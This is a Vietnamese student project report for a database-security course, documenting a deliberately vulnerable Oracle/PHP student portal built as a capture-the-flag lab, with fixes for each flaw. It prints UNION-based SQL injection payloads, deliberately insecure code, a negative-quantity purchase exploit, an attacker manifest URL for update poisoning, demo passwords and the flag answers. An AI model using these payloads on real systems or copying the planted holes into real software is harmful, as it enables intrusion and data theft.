# BÁO CÁO ĐỒ ÁN MÔN DBS401
# STRENGTHENING DATABASE SECURITY WITH ORACLE DATABASE


**Môn học:** DBS401 – Database Security  
**Đề tài:** Strengthening Database Security with Oracle Database  
**Nhóm:** Group 02  
**Học kỳ:** SUMMER 2026  
**Ngày nộp:** *12/6/2026*  
> **Ghi chú về Flag 1:** Việc chia flag thành 3 phần (Hex, Reverse, Base64) ở 3 bảng khác nhau ép người làm lab phải:
> 1. Sử dụng kỹ thuật Enumerate Metadata để tìm bảng.
> 2. Biết cách xử lý các hàm chuỗi trong Oracle.
> 3. Có kỹ năng Decode thủ công/scripting.


## THÀNH VIÊN NHÓM

| STT | Họ và tên        | MSSV               |
|-----|------------------|--------------------|
| 1   | Nguyen Nam Khanh | HE191159 (Leader)  | 
| 2   | Nguyen Hai Anh   | HE172727           | 
| 3   | Nguyen Cong Tien | HE180928           | 
| 4   | Nguyen Huu Phuc  | HE181521           | 


**Giảng viên hướng dẫn:** *AnhHT68*

---

## MỤC LỤC

1. Giới thiệu  
2. Công nghệ sử dụng  
3. Kiến trúc hệ thống  
4. Thiết kế database Oracle  
5. Mô tả web application  
6. Ba lỗ hổng bảo mật  
7. Bảng độ khó  
8. Hướng dẫn triển khai  
9. Phân công công việc  
10. Kết luận  
11. Tài liệu tham khảo  

---

## 1. GIỚI THIỆU

### 1.1 Bối cảnh bảo mật cơ sở dữ liệu

Cơ sở dữ liệu (Database) là trung tâm lưu trữ mọi thông tin quan trọng của tổ chức, từ thông tin cá nhân người dùng đến dữ liệu tài chính và bí mật kinh doanh. Theo báo cáo của IBM Security (2023), chi phí trung bình của một vụ rò rỉ dữ liệu toàn cầu lên tới 4,45 triệu USD. Các lỗ hổng bảo mật trong tầng database thường là nguyên nhân trực tiếp dẫn đến những thiệt hại nghiêm trọng này.

Oracle Database là một trong những hệ quản trị cơ sở dữ liệu quan hệ hàng đầu thế giới, được sử dụng rộng rãi trong các tổ chức tài chính, giáo dục và chính phủ. Hiểu rõ các lỗ hổng bảo mật trong Oracle và cách vá chúng là kỹ năng thiết yếu cho kỹ sư phần mềm và chuyên gia bảo mật.

### 1.2 Mục tiêu đồ án

Đồ án DBS401 của nhóm 02 hướng đến các mục tiêu sau:

- Xây dựng một web application thực tế kết nối Oracle Database.
- Cố tình tích hợp 3 lỗ hổng bảo mật liên quan trực tiếp đến database.
- Trình bày quy trình phát hiện, khai thác và vá lỗi từng lỗ hổng.
- Xây dựng hệ thống CTF (Capture The Flag) nhằm tăng tính thực hành cho người học.

### 1.3 Phạm vi thực hiện

Toàn bộ dự án hoạt động trong môi trường **lab học tập nội bộ**:

- Web application chạy local tại `http://127.0.0.1/dbs401-oracle-app`
- Oracle Database XE/Free chạy local trên cùng máy
- Mọi payload và kỹ thuật khai thác chỉ áp dụng trên hệ thống do nhóm tự xây dựng

### 1.4 Cam kết an toàn

> **Nhóm cam kết:** Tất cả nội dung khai thác trong đồ án này chỉ được thực hiện trên web application và database do nhóm tự xây dựng và kiểm soát. Không áp dụng bất kỳ kỹ thuật nào lên hệ thống thực tế, hệ thống của bên thứ ba, hoặc môi trường ngoài phạm vi lab.

---

## 2. CÔNG NGHỆ SỬ DỤNG

| Thành phần | Phiên bản | Mục đích |
|-----------|-----------|---------|
| Ubuntu | 20.04 / 22.04 LTS | Hệ điều hành server |
| Apache2 | 2.4.x | Web server |
| PHP | 8.1.x | Backend scripting |
| Oracle Database | XE 21c / 23c Free | Cơ sở dữ liệu chính |
| Oracle Instant Client | 21.x | Kết nối PHP ↔ Oracle |
| OCI8 | 3.x (PHP extension) | Driver PHP cho Oracle |
| SQL*Plus | Theo Oracle XE | Công cụ quản lý DB |
| Python | 3.x | Script khai thác Vuln 3 |
| Burp Suite | Community | Intercepting HTTP requests |

---

## 3. KIẾN TRÚC HỆ THỐNG

```
┌─────────────────────────────────────────────────────────┐
│                    User Browser                         │
│           (Burp Suite / curl / Python script)           │
└────────────────────────┬────────────────────────────────┘
                         │ HTTP Request
                         ▼
┌─────────────────────────────────────────────────────────┐
│              Apache2 Web Server                         │
│         /var/www/html/dbs401-oracle-app/                │
└────────────────────────┬────────────────────────────────┘
                         │ PHP Execution
                         ▼
┌─────────────────────────────────────────────────────────┐
│                  PHP 8.1 Backend                        │
│  ┌──────────┐  ┌──────────┐  ┌───────────┐  ┌────────┐  │
│  │config.php│  │search.php│  │store.php  │  │partner │  │
│  │(session) │  │(Vuln 1)  │  │(Vuln 2) │    │_config │  │
│  └──────────┘  └──────────┘  └───────────┘  │(V3A)   │  │
│                      ┌───────────┐          └────────┘  │
│                      │admin.php  │  (V3B update trigger)│
│                      └───────────┘                      │
└────────────────────────┬────────────────────────────────┘
                         │ OCI8 oci_connect()
                         ▼
┌─────────────────────────────────────────────────────────┐
│           Oracle Instant Client (OCI8 Driver)           │
│              TNS: localhost:1539/XEPDB1                 │
└────────────────────────┬────────────────────────────────┘
                         │ Oracle Net Protocol
                         ▼
┌─────────────────────────────────────────────────────────┐
│          Oracle Database XE 21c / 23c Free              │
│  User: DBS401_USER  │  Service: XE                      │
│  ┌────────────────────────────────────────────────────┐ │
│  │ USERS │ STUDENTS │ COURSES │ ENROLLMENTS           │ │
│  │ AUDIT_LOGS │ FLAGS │ ADMIN_SECRETS │ CONFIG_STORE  │ │
│  │ FAKE_FLAGS │ SYSTEM_HINTS │ FLAG_ARCHIVE           │ │
│  └────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────┘
```

### 3.2 Threat Modeling & Asset Mapping

Hệ thống được thiết kế dựa trên việc xác định các tài sản quan trọng (Assets) và các mối đe dọa tương ứng:

| Tài sản (Asset) | Mục tiêu bảo vệ | Lỗ hổng tương ứng |
|:---|:---|:---|
| **User & Secret Data** | Tính bảo mật (Confidentiality) | **Vuln 1 (SQLi)**: Rò rỉ thông tin từ các bảng FLAGS, USERS và CONFIG_STORE. |
| **Financial Integrity** | Tính toàn vẹn (Integrity) | **Vuln 2 (Business Logic)**: Thao túng số dư Credits thông qua giá trị âm. |
| **Software Integrity** | Tính tin cậy (Trust) | **Vuln 3 (Supply Chain)**: Đầu độc luồng cập nhật hệ thống thông qua đối tác giả mạo. |

### 3.1 Luồng hoạt động chính

**Luồng Login:**
1. User gửi POST với username/password
2. PHP query Oracle với bind variable (login KHÔNG bị lỗ hổng)
3. Xác thực password bằng `password_verify()` (bcrypt)
4. Lưu user_id, username, role vào PHP session
5. Redirect đến dashboard

**Luồng phân quyền:**
- `$_SESSION['role']` = student / teacher / admin
- Admin: truy cập admin.php, audit.php (toàn bộ logs)
- Teacher: truy cập search.php
- Student: chỉ xem transcript và profile của mình

**Điểm đặt lỗ hổng cố ý:**
- `search.php`: Tham số `?q=` không được parameterize → SQLi
- `store.php`: Lỗi logic mua hàng với số lượng âm → Business Logic Attack
- `partner_config.php`: thiếu kiểm tra role nên user thường đổi được `update_url` → Broken Access Control
- `admin.php?check_updates=1`: tin tưởng URL cập nhật từ DB và manifest không ký số → Supply Chain Attack

---

## 4. THIẾT KẾ DATABASE ORACLE

### 4.1 Entity-Relationship Overview

```
USERS ──────── STUDENTS ──── ENROLLMENTS ──── COURSES
  │                               │
  │                           AUDIT_LOGS
  │
  └── ADMIN_SECRETS, CONFIG_STORE, FLAGS,
      FAKE_FLAGS, SYSTEM_HINTS, FLAG_ARCHIVE
```

### 4.2 Mô tả các bảng chính

**USERS** – Tài khoản đăng nhập  
**STUDENTS** – Thông tin sinh viên (bao gồm sinh viên ẩn cho CTF)  
**COURSES** – Danh sách môn học  
**ENROLLMENTS** – Đăng ký môn + điểm, có `transcript_ref` và `internal_note`  
**AUDIT_LOGS** – Ghi log hành động, `metadata_note` chứa fragment mã hóa  
**FLAGS** – Lưu flag part A (hex encoded), có decoy  
**ADMIN_SECRETS** – Lưu secret thật + fake/decoy legacy  
**CONFIG_STORE** – Cấu hình hệ thống, chứa `update_url`, `app_version` và marker cho Flag 1  
**FAKE_FLAGS** – Bảng chứa fake flags để đánh lạc hướng  
**SYSTEM_HINTS** – Gợi ý gián tiếp cho người khai thác  
**FLAG_ARCHIVE** – Bảng decoy trông giống bảng flag nhưng chứa fake data  

### 4.3 Chiến lược lưu trữ flag

Để đạt mức độ Very Hard, flag không được lưu nguyên văn ở bất kỳ bảng nào:

| Flag | Part | Vị trí | Encoding |
|------|------|---------|----------|
| Flag 1 | A | FLAGS.flag_part (part_order=1) | Hex encoding |
| Flag 1 | B | AUDIT_LOGS.metadata_note | Reversed string trong JSON |
| Flag 1 | C | CONFIG_STORE.config_value (key='sys_alpha_marker') | Base64 encoding |
| Flag 2 | - | Trang store.php (Vật phẩm "Exam Leak 2024") | Logic Manipulation |
| Flag 3 | A | Partner manifest `flag_part` | Nửa đầu hex |
| Flag 3 | B | `admin.php` server-side constant `FLAG3_LOCAL_HEX_SUFFIX` | Nửa sau hex; chỉ ghép/decode khi update thành công |

---

## 5. MÔ TẢ WEB APPLICATION

### 5.1 FPT Student Portal

Nhóm xây dựng mô phỏng **cổng thông tin sinh viên FPT** với các chức năng:

| Trang | Chức năng | Ghi chú |
|-------|-----------|---------|
| `/login.php` | Đăng nhập | Secure (parameterized) |
| `/dashboard.php` | Tổng quan tài khoản | Xem điểm, enrollment |
| `/search.php` | Tìm kiếm sinh viên | **[VULN 1]** SQLi |
| `/profile.php` | Xem thông tin cá nhân | Secure |
| `/store.php` | Cửa hàng học liệu | **[VULN 2]** Business Logic (Negative Quantity) |
| `/transcript.php` | Xem bảng điểm/transcript | Secure (đã vá IDOR) |
| `/audit.php` | Xem audit log | Secure (đã vá IDOR) |
| `/admin.php` | Quản trị hệ thống | Quản lý người dùng (CRUD), **[VULN 3]** Supply Chain Poisoning |

### 5.2 Tài khoản demo

| Username | Password | Role |
|----------|----------|------|
| admin | Admin@DBS401!2024 | Quản trị viên |
| teacher1 | Teacher@123 | Giáo viên |
| student1 | Student@123 | Sinh viên |
| student2 | Student@123 | Sinh viên |
| student3 | Student@123 | Sinh viên |

---

## 6. BA LỖ HỔNG BẢO MẬT

---

### 6.1 VULNERABILITY 1 – Oracle SQL Injection

**Mức độ lỗ hổng (phân loại DBS401):** Easy  
**Mức độ tìm flag:** Very Hard  
**Vị trí:** `search.php`, tham số `?q=`  
**Loại tấn công:** UNION-based SQL Injection  

#### Mô tả lỗ hổng

Chức năng tìm kiếm sinh viên nhận tham số `q` từ URL và nhúng trực tiếp vào câu lệnh SQL mà không sử dụng parameterized query. Mặc dù có blacklist lọc một số từ khóa DDL (DROP, DELETE), blacklist này không ngăn được UNION SELECT, FROM, WHERE – những thành phần cốt lõi của SQL Injection.

#### Đoạn code bị lỗi

```php
// VULNERABLE – string concatenation
$sql = "SELECT student_id, full_name, major
        FROM STUDENTS
        WHERE (full_name LIKE '%$keyword%' OR major LIKE '%$keyword%')
        AND hidden_marker = 'NORMAL'
        AND ROWNUM <= 5";
```

#### Nguyên nhân

- Không sử dụng `oci_bind_by_name()` để parameterize input.
- Blacklist chỉ chặn DDL, không chặn các từ khóa DML/query như UNION, SELECT.
- Lỗi SQL bị suppress nhưng injection vẫn hoạt động.

#### Tác động

- Kẻ tấn công có thể đọc toàn bộ dữ liệu trong database (bao gồm FLAGS, ADMIN_SECRETS, CONFIG_STORE, AUDIT_LOGS).
- Rò rỉ cấu trúc database qua USER_TABLES, USER_TAB_COLUMNS.
- Đọc thông tin nhạy cảm của người dùng khác.

#### Kịch bản khai thác (lab)

```
Bước 1: Xác nhận injection
  q=' AND '1'='1  →  trả về kết quả bình thường
  q=' AND '1'='2  →  trả về rỗng → confirmed

Bước 2: Xác định số cột
  q=' UNION SELECT NULL,NULL,NULL FROM DUAL WHERE '1'='1

Bước 3: Enumerate bảng
  q=' UNION SELECT ROWNUM,table_name,NULL FROM USER_TABLES WHERE ROWNUM<=5 AND '1'='1

Bước 4: Lấy flag parts từ FLAGS, AUDIT_LOGS, CONFIG_STORE
  q=' UNION SELECT 1,flag_part,flag_code FROM FLAGS WHERE part_order=1 AND '1'='1
  q=' UNION SELECT 1,metadata_note,action FROM AUDIT_LOGS WHERE action='SYSTEM_AUDIT_CHECK' AND '1'='1
  q=' UNION SELECT 1,config_value,config_key FROM CONFIG_STORE WHERE config_key='sys_alpha_marker' AND '1'='1

Bước 5: Decode và ghép 3 phần flag
  Part A (hex):    DBS401{SQL_
  Part B (reverse): 1nj3ct10n_
  Part C (base64):  0r4cl3!}
```

#### Vì sao flag Very Hard

- Output bị giới hạn 5 rows, cần nhiều payload khác nhau.
- Tồn tại nhiều bảng decoy (FLAG_ARCHIVE) và fake flag (FAKE_FLAGS).
- Các phần flag được encode khác nhau (hex/reverse/base64) → cần decode thủ công.
- Cần query Oracle-specific metadata tables (USER_TABLES, USER_TAB_COLUMNS).
- Phải xác định đúng thứ tự ghép 3 phần bằng cách đọc hint trong metadata.

#### Cách khắc phục

```php
// Secure version – bind variable
$param = '%' . $keyword . '%';
$sql   = "SELECT student_id, full_name, major FROM STUDENTS
          WHERE (full_name LIKE :kw OR major LIKE :kw2)
          AND hidden_marker = 'NORMAL' AND ROWNUM <= 10";
$stmt = oci_parse($conn, $sql);
oci_bind_by_name($stmt, ':kw',  $param);
oci_bind_by_name($stmt, ':kw2', $param);
oci_execute($stmt);
```

---

### 6.2 VULNERABILITY 2 – Insecure Business Logic (Negative Quantity)

**Mức độ lỗ hổng (phân loại DBS401):** Hard  
**Mức độ tìm flag:** Very Hard  
**Vị trí:** `store.php`, tham số `quantity` (POST)
**Loại tấn công:** Business Logic Manipulation / Integer Overflow

#### Mô tả lỗ hổng

Chức năng mua tài liệu tại `store.php` cho phép người dùng nhập số lượng tùy ý. Hệ thống chỉ thực hiện kiểm tra `số dư >= (số lượng * đơn giá)`. Do không kiểm tra số lượng phải là số dương (>0), kẻ tấn công có thể nhập một số lượng âm cực lớn. Khi đó, phép tính `số dư - (số âm * đơn giá)` sẽ trở thành phép cộng, giúp tăng số dư tài khoản lên vô hạn.

#### Đoạn code bị lỗi

```php
// VULNERABLE – Thiếu kiểm tra giá trị âm cho $qty
$cost = $qty * $price;
if ($credits >= $cost) {
    $newCredits = $credits - $cost;
```

#### Nguyên nhân

Lập trình viên chỉ tập trung vào việc kiểm tra đủ số dư (Abuse of Functionality) mà quên mất việc xác thực tính hợp lý của dữ liệu đầu vào (Input Validation) về mặt logic nghiệp vụ.

#### Tác động

Kẻ tấn công có thể mua được các vật phẩm "CLASSIFIED" có giá trị cực cao (chứa Flag) mà không cần nạp tiền, gây thiệt hại về kinh tế và lộ lọt thông tin bí mật.

#### Kịch bản khai thác (lab)

1. Đăng nhập bằng tài khoản sinh viên (ví dụ: `student1 / Student@123`).
2. Truy cập trang "Course Material Store" (`store.php`).
3. Chọn một tài liệu bất kỳ, nhập số lượng âm cực lớn (ví dụ: `-20000`) vào ô số lượng.
4. Nhấn "Order". Do hệ thống lấy `credits - (quantity * price)`, số dư sẽ được cộng thêm 2,000,000 Credits.
5. Dùng số tiền này mua vật phẩm "Exam Leak 2024 (CLASSIFIED)" để lấy Flag 2.

#### Vì sao flag Very Hard

Kẻ tấn công phải quan sát sự thay đổi của Credits sau mỗi lần mua hàng để nhận ra lỗ hổng logic. Flag 2 chỉ xuất hiện khi số dư đạt mức triệu Credits, đòi hỏi sự kết hợp giữa kỹ thuật thao túng tham số và hiểu biết về nghiệp vụ thanh toán.

#### Cách khắc phục

```php
// Secure – Kiểm tra số lượng phải lớn hơn 0
if ($qty <= 0) {
    $msg = "Quantity must be a positive number.";
} else {
    // Thực hiện trừ tiền bình thường
}
```

---

### 6.3 VULNERABILITY 3 – Supply Chain Poisoning via Broken Access Control

**Mức độ lỗ hổng (phân loại DBS401):** Hard (Chained Attack)  
**Mức độ tìm flag:** Very Hard  
**Vị trí:** `search.php`, `partner_config.php`, `admin.php?check_updates=1`  
**Loại tấn công:** SQLi-based Reconnaissance + Broken Access Control + Supply Chain Poisoning

#### Mô tả lỗ hổng

Luồng update của hệ thống phụ thuộc vào URL đối tác được lưu trong bảng `CONFIG_STORE` với key `update_url`. Giá trị này không hiển thị trong Admin Panel vì `is_public=0`, nhưng người chơi có thể dùng SQL Injection ở `search.php` để phát hiện `update_url` và `app_version`.

Sau đó, endpoint ẩn `partner_config.php` cho phép **bất kỳ user đã đăng nhập** cập nhật `CONFIG_STORE.update_url` mà không kiểm tra role admin. Khi admin gọi `admin.php?check_updates=1`, server fetch manifest từ URL đã bị đổi. Nếu manifest có `version` lớn hơn `APP_VERSION`, hệ thống lấy `flag_part`, ghép với suffix hardcoded server-side trong `admin.php`, decode hex và hiển thị Flag 3.

#### Đoạn code bị lỗi

`partner_config.php` chỉ kiểm tra đăng nhập, không kiểm tra quyền admin:

```php
if (empty($_SESSION['user_id'])) {
    header('Location: ' . APP_BASE . '/login.php');
    exit;
}
// Missing: if ($_SESSION['role'] !== 'admin') { ... }

$sql = "UPDATE CONFIG_STORE
        SET config_value = :url,
            updated_at = SYSDATE
        WHERE config_key = 'update_url'";
```

`admin.php` tin tưởng URL từ DB và manifest chưa có chữ ký:

```php
$q = oci_parse($conn, "SELECT config_value FROM CONFIG_STORE WHERE config_key = 'update_url'");
oci_execute($q);
$url = $conf['CONFIG_VALUE'] ?? DEFAULT_UPDATE_URL;
$jsonData = @file_get_contents($url);
```

Khi version hợp lệ, `admin.php` ghép mảnh hex từ manifest với suffix server-side:

```php
$manifestFlagPart = $manifest['flag_part'] ?? '';
$flag3 = decodeHexFlagFragment($manifestFlagPart);
```

#### Nguyên nhân

1. `partner_config.php` thiếu Broken Access Control: không kiểm tra `$_SESSION['role'] === 'admin'`.
2. `admin.php` tin tưởng `update_url` từ database mà không whitelist domain/URL.
3. Manifest JSON không có chữ ký số/HMAC nên attacker có thể giả mạo nội dung.
4. Logic `version_compare()` bị lợi dụng bằng manifest có version cao bất thường như `9.9.9`.

#### Tác động

User thường có thể đầu độc nguồn cập nhật của hệ thống. Khi admin trigger update, server kết nối tới manifest của attacker và hiển thị Flag 3. Trong hệ thống thật, pattern tương tự có thể dẫn tới SSRF, supply-chain poisoning, hoặc tải payload sai nguồn.

#### Kịch bản khai thác lab

1. Đăng nhập bằng `student1 / Student@123`.
2. Dùng SQLi ở `search.php` để đọc `CONFIG_STORE.update_url` và `CONFIG_STORE.app_version`.
3. Fuzz/tìm endpoint ẩn `partner_config.php`.
4. Dùng quyền user thường POST `manifest_url=http://ATTACKER:8081/manifest.json` vào `partner_config.php`.
5. Attacker phục vụ `manifest.json`:

```json
{
  "version": "9.9.9",
  "status": "critical_update",
  "checksum": "deadbeef1337",
  "flag_part": "4442533430317b3575707031795f436834"
}
```

6. Đăng nhập admin và gọi `admin.php?check_updates=1`.
7. `admin.php` ghép `flag_part` với `FLAG3_LOCAL_HEX_SUFFIX`, decode hex và hiển thị:

```text
DBS401{5upp1y_Ch41n_P0150n1ng_0912}
```

#### Vì sao flag Very Hard

- Người chơi phải dùng SQLi để hiểu cơ chế `update_url`/`app_version`, nhưng SQLi không trực tiếp đổi được DB vì OCI8 không hỗ trợ stacked query.
- Endpoint đổi URL bị ẩn khỏi navbar, phải tìm bằng fuzz/recon.
- Manifest không chứa full flag; chỉ chứa nửa đầu hex.
- Nửa sau nằm server-side trong `admin.php` và chỉ được ghép/decode sau khi update thành công.
- Có decoy như `oracle_flag_3_backup`, `FAKE_FLAGS`, `FLAG_ARCHIVE` khiến người chơi dễ đi sai hướng.

#### Cách khắc phục

```php
// partner_config.php secure
if ($_SESSION['role'] !== 'admin') {
    http_response_code(403);
    exit;
}

$allowedManifestUrls = [
    'http://127.0.0.1:8081/manifest.json',
    'https://cdn.fpt-partner.net/v3/manifest.json'
];

if (!in_array($manifestUrl, $allowedManifestUrls, true)) {
    die('Blocked: manifest URL is not approved.');
}
```

Ngoài ra, `admin.php` cần whitelist URL trước khi fetch, chặn IP nội bộ/metadata trong môi trường cloud, đặt timeout ngắn, và verify chữ ký số/HMAC của manifest trước khi tin bất kỳ field nào.

---

## 7. BẢNG ĐỘ KHÓ

| Lỗ hổng | Loại | Mức độ lỗ hổng (DBS401) | Mức độ tìm flag |
|---------|------|--------------------------|-----------------|
| Vulnerability 1 | Oracle SQL Injection | **Easy** | **Very Hard** |
| Vulnerability 2 | Insecure Business Logic | **Hard** | **Very Hard** |
| Vulnerability 3 | Broken Access Control + Supply Chain Poisoning | **Hard** | **Very Hard** |

> **Ghi chú quan trọng:**  
> Nhóm tuân thủ khuyến nghị Easy – Medium – Hard cho mức độ nhận diện và phân loại lỗ hổng theo yêu cầu môn DBS401. Tuy nhiên, để tăng tính thử thách CTF và khả năng phân tích database security thực tế, cả 3 flag đều được thiết kế ở mức **Very Hard**. Người kiểm thử không thể lấy flag bằng một request đơn giản mà phải kết hợp: recon, phân tích request/response, truy vấn Oracle metadata, loại bỏ dữ liệu giả (fake flags, decoy tables), decode (hex/base64/reverse), và ghép nhiều mảnh flag từ nhiều bảng khác nhau.

---

## 8. HƯỚNG DẪN TRIỂN KHAI LOCAL

### 8.1 Yêu cầu hệ thống

- Ubuntu 20.04 / 22.04 LTS (khuyến nghị dùng VM/VirtualBox)
- RAM: tối thiểu 4GB (Oracle XE cần ~2GB)
- Disk: tối thiểu 20GB

### 8.2 Các bước cài đặt thủ công

**Bước 1 – Cài Apache2 và PHP:**
```bash
sudo apt-get update
sudo apt-get install -y apache2 php8.1 libapache2-mod-php8.1 php8.1-cli
```

**Bước 2 – Cài Oracle Database XE 21c:**
```bash
# Tải từ: https://www.oracle.com/database/technologies/xe-downloads.html
sudo apt-get install -y alien libaio1 bc
sudo alien --to-deb --scripts oracle-database-xe-21c-1.0-1.ol8.x86_64.rpm
sudo dpkg -i oracle-database-xe-21c*.deb
sudo /etc/init.d/oracle-xe-21c configure
sudo systemctl enable oracle-xe-21c
```

**Bước 3 – Cài Oracle Instant Client và OCI8:**
```bash
# Cài Instant Client (tải .rpm từ Oracle website)
sudo alien --to-deb oracle-instantclient-basiclite-21.*.rpm
sudo alien --to-deb oracle-instantclient-devel-21.*.rpm
sudo dpkg -i oracle-instantclient*.deb
echo /usr/lib/oracle/21/client64/lib | sudo tee /etc/ld.so.conf.d/oracle-21.conf
sudo ldconfig

# Cài OCI8 extension
sudo apt-get install -y php8.1-dev php-pear build-essential
sudo pecl install oci8
echo "extension=oci8.so" | sudo tee -a /etc/php/8.1/apache2/php.ini
echo "extension=oci8.so" | sudo tee -a /etc/php/8.1/cli/php.ini
sudo systemctl restart apache2
```

**Bước 4 – Tạo Oracle user:**
```sql
-- Chạy trong SQLPlus với SYS
CREATE USER dbs401_user IDENTIFIED BY dbs401_pass;
GRANT CONNECT, RESOURCE, CREATE SESSION TO dbs401_user;
GRANT CREATE TABLE, CREATE SEQUENCE TO dbs401_user;
ALTER USER dbs401_user QUOTA UNLIMITED ON USERS;
```

**Bước 5 – Import schema và seed data:**
```bash
sqlplus dbs401_user/dbs401_pass@localhost:1539/XEPDB1 @/path/to/database/schema.sql
sqlplus dbs401_user/dbs401_pass@localhost:1539/XEPDB1 @/path/to/database/seed.sql
php /var/www/html/dbs401-oracle-app/database/init_passwords.php
```

**Bước 6 – Deploy web app:**
```bash
sudo bash setup.sh
```

### 8.3 URL truy cập

- **Local (máy host):** `http://127.0.0.1/dbs401-oracle-app`
- **LAN (nhóm khác test):** `http://<IP-LAN>/dbs401-oracle-app`
  - Lấy IP LAN: `hostname -I | awk '{print $1}'`

> **Lưu ý:** `127.0.0.1` chỉ truy cập được từ chính máy đang chạy server. Nếu nhóm khác hoặc giảng viên cần test từ máy khác trong cùng mạng LAN, phải dùng IP LAN của máy host.

> **Về setup.sh:** Script mặc định copy source từ thư mục hiện tại vào `/var/www/html/dbs401-oracle-app`. Nếu project được host trên GitHub, có thể sửa biến `REPO_URL` trong setup.sh để script tự clone.

---


## 9. KẾT LUẬN

### 9.1 Những gì đã học được

Qua quá trình thực hiện đồ án, nhóm đã học được:

- **SQL Injection thực tế:** Hiểu sâu về cơ chế injection trong Oracle Database, sự khác biệt giữa Oracle SQL và MySQL (DUAL, ROWNUM, USER_TABLES, SUBSTR syntax).
- **IDOR và Access Control:** Nhận thức rõ tầm quan trọng của việc kiểm tra ownership ở tầng database, không chỉ ở tầng UI.
- **Blind SQL Injection:** Kỹ thuật khai thác khi không có direct output, sử dụng boolean condition + SUBSTR + ASCII để extract dữ liệu từng ký tự.
- **Oracle OCI8:** Cách sử dụng bind variables trong PHP-Oracle để phòng tránh SQLi.
- **CTF Design:** Thiết kế hệ thống flag phức tạp với nhiều lớp encoding và decoy.

### 9.2 Khó khăn gặp phải

- Cài đặt Oracle XE trên Ubuntu phức tạp hơn MySQL/PostgreSQL nhiều.
- OCI8 extension cần cài thủ công và phụ thuộc Oracle Instant Client.
- Oracle SQL syntax khác biệt (không có `LIMIT`, dùng `ROWNUM`; không có `INFORMATION_SCHEMA`, dùng `USER_TABLES`).
- Cân bằng độ khó CTF giữa 3 flag để đảm bảo cả 3 đều Very Hard.

### 9.3 Hướng phát triển

- Bổ sung thêm lỗ hổng: Time-Based Blind SQLi, Oracle XML Injection, Privilege Escalation.
- Tích hợp WAF (Web Application Firewall) demo để so sánh hiệu quả.
- Xây dựng hệ thống tự động chấm điểm CTF online.
- Triển khai lên OCI (Oracle Cloud Infrastructure) Free Tier.

---

## 10. TÀI LIỆU THAM KHẢO

1. OWASP Foundation. (2021). *OWASP Top 10:2021 – A03 Injection*. https://owasp.org/Top10/A03_2021-Injection/
2. OWASP Foundation. (2021). *OWASP Top 10:2021 – A01 Broken Access Control*. https://owasp.org/Top10/A01_2021-Broken_Access_Control/
3. Oracle Corporation. (2023). *Oracle Database Security Guide 21c*. https://docs.oracle.com/en/database/oracle/oracle-database/21/dbseg/
4. Oracle Corporation. (2023). *PHP OCI8 Extension Documentation*. https://www.php.net/manual/en/book.oci8.php
5. PortSwigger. (2023). *SQL Injection Cheat Sheet – Oracle*. https://portswigger.net/web-security/sql-injection/cheat-sheet
6. PortSwigger. (2023). *Insecure Direct Object References (IDOR)*. https://portswigger.net/web-security/access-control/idor
7. IBM Security. (2023). *Cost of a Data Breach Report 2023*. https://www.ibm.com/reports/data-breach
8. CWE. (2023). *CWE-89: Improper Neutralization of Special Elements used in an SQL Command*. https://cwe.mitre.org/data/definitions/89.html
9. CWE. (2023). *CWE-639: Authorization Bypass Through User-Controlled Key*. https://cwe.mitre.org/data/definitions/639.html

---

*Báo cáo được soạn thảo bởi Group 02 – DBS401*  
*Cam kết: Tất cả nội dung khai thác trong báo cáo này chỉ được thực hiện trong môi trường lab học tập nội bộ.*
